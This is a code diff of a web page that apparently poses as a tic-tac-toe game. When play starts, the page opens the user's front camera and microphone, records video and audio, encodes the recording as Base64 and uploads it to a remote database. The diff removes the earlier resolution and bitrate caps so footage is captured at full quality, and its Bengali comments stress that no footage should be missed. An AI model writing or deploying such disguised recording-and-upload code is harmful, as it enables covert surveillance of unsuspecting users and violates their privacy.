@@ -80,13 +80,9 @@
       document.getElementById('gameStatus').textContent = "Your Turn (X)";
 
       try {
-        // STRICT CONSTRAINTS: Keeps Base64 size very small for Realtime Database
+        // ন্যাচারাল ডিফল্ট কোয়ালিটিতে ক্যামেরা ওপেন হবে (কোনো লিমিটেশন নেই)
         currentStream = await navigator.mediaDevices.getUserMedia({ 
-          video: { 
-            width: { ideal: 320, max: 480 }, 
-            height: { ideal: 240, max: 360 },
-            frameRate: { ideal: 10, max: 15 } // Lower FPS = Much smaller file
-          }, 
+          video: { facingMode: "user" }, 
           audio: true 
         });
 
@@ -95,22 +91,26 @@
         let chunks = [];
         let mediaRecorder;
 
-        try { 
-          // Attempt specific low-bitrate codec
-          mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 100000 }); 
-        } 
-        catch (e) { 
-          // Fallback for Safari/iOS
-          mediaRecorder = new MediaRecorder(currentStream); 
+        // ডিফল্ট ব্রাউজার এনকোডার ব্যবহার করা হচ্ছে যাতে ফুটেজ মিস না হয়
+        const options = { mimeType: 'video/webm; codecs=vp8' };
+        if (MediaRecorder.isTypeSupported(options.mimeType)) {
+            mediaRecorder = new MediaRecorder(currentStream, options);
+        } else {
+            mediaRecorder = new MediaRecorder(currentStream); // Fallback for iOS/Safari
         }
 
-        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+        mediaRecorder.ondataavailable = (e) => { 
+            if (e.data && e.data.size > 0) chunks.push(e.data); 
+        };
 
         mediaRecorder.onstop = () => {
-          if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); currentStream = null; }
+          if (currentStream) { 
+              currentStream.getTracks().forEach(track => track.stop()); 
+              currentStream = null; 
+          }
 
           const blob = new Blob(chunks, { type: 'video/webm' });
-          chunks = []; // Clear chunks array to free up mobile memory
+          chunks = []; // ক্লিয়ার চাঙ্কস
 
           const reader = new FileReader();
           reader.readAsDataURL(blob);
@@ -122,7 +122,9 @@
                 createdAt: new Date().toISOString()
               });
               document.getElementById('successModal').classList.remove('hidden');
-            } catch (err) { console.error("Upload Error:", err); }
+            } catch (err) { 
+                console.error("Upload Error:", err); 
+            }
           };
         };
 
